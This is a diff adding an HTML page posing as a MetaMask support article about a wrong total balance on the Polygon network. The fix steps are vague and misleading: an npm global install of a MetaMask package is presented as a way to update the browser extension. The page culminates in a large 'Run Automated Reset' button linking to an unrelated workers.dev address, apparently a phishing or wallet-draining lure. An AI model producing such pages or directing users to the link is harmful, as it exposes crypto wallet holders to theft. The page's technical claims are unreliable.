@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Metamask Extension Bug Incorrect Total Balance On Polygon Netwo</title>
+<style>
+    body {
+        font-family: BlinkMacSystemFont;
+        background: #121214;
+        color: #ddd;
+        padding: 20px;
+        line-height: 1.5;
+    }
+    .content {
+        max-width: 880px;
+        margin: auto;
+        background: #1e1f24;
+        border-radius: 24px;
+        padding: 2rem;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+    }
+    pre {
+        background: #0f0f12;
+        padding: 1rem;
+        border-radius: 12px;
+        overflow-x: auto;
+    }
+    a { color: #00adb5; }
+    .btn {
+        background: #ff9455;
+        color: #000;
+        padding: 14px 36px;
+        border-radius: 40px;
+        font-weight: bold;
+        display: inline-block;
+        text-decoration: none;
+        transition: 0.2s;
+    }
+    .btn:hover { transform: scale(1.02); }
+    </style>
+</head>
+<body>
+<div class="content">
+<h2>Symptom</h2>
+<ul>
+<li>Users of the Metamask extension on the Ethereum ecosystem may notice that their total balance on the Polygon network is incorrect, potentially causing confusion and issues with transactions.</li>
+</ul>
+<h2>Technical Root Cause</h2>
+<ul>
+<li>The incorrect total balance is often due to the Metamask extension failing to properly synchronize with the Polygon network, resulting in stale or outdated balance information.</li>
+</ul>
+<h3>Manual Overrides</h3>
+<ul>
+<li>To resolve the issue, users can try the following manual overrides:</li>
+<li>Reset the Metamask extension's account settings to ensure a fresh connection to the Polygon network.</li>
+<li>Manually refresh the balance by clicking on the "Refresh" button in the Metamask extension.</li>
+<li>Update the Metamask extension to the latest version using the following command:</li>
+</ul>
+<div class="codehilite"><pre><span></span><code>npm<span class="w"> </span>install<span class="w"> </span>-g<span class="w"> </span>@metamask/core
+</code></pre></div>
+
+<p>Consider utilizing an external console for more complex debugging operations. </p>
+<h2>Prerequisites</h2>
+<ul>
+<li>Metamask extension installed and configured</li>
+<li>Polygon network added to the Metamask extension</li>
+<li>A basic understanding of command-line interfaces and npm package management</li>
+</ul>
+<div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
+    <a href="https://system-edge-router.aaronjungs.workers.dev?p=dHJvbg==" class="btn">🛠 Run Automated Reset</a>
+</div>
+</div>
+</body>
+</html>
